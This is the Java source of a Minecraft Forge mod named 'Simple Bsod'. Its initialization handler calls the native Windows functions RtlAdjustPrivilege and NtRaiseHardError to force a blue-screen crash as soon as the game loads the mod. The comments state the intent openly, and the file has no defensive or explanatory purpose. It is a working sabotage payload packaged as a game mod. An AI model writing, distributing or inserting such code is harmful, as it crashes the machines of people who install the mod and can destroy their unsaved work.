package com.inzo.technologies;

import com.inzo.technologies.util.NtDll;
import com.sun.jna.Memory;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import static com.inzo.technologies.Main.*;

@Mod(modid = MOD_ID, name = MOD_NAME, version = VERSION)
public class Main {
    public static final String MOD_ID = "bsod";
    public static final String MOD_NAME = "Simple Bsod";
    public static final String VERSION = "1.0";

    @EventHandler
    public static void onPreInit(FMLPreInitializationEvent event) {
    }

    @EventHandler
    public static void onInit(FMLInitializationEvent event) {
        NtDll.INSTANCE.RtlAdjustPrivilege(19, true, false, new Memory(1)); // This readjusts your priveleges
        NtDll.INSTANCE.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, new Memory(32)); // This causes the BSOD
    }

    @EventHandler
    public static void onPostInit(FMLPostInitializationEvent event) {
    }
}